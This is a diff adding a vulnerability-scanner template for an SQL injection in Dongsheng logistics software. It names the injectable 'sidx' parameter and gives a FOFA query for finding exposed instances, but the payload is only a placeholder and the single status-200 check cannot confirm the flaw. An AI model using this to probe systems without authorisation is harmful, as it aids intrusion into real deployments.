@@ -1,0 +1,21 @@
+id: poc-6235482359
+info:
+  name: 东胜物流软件 HtmlSearchServiceLCL.aspx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: sqli,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: app="东胜物流软件-物流软件"
+http:
+- raw:
+  - 'GET /PriceCarrier/HtmlSearchServiceLCL.aspx?page=1&rows=10&sidx=SQLI_POC&sord=asc&searchField=&searchString=&searchOper= HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
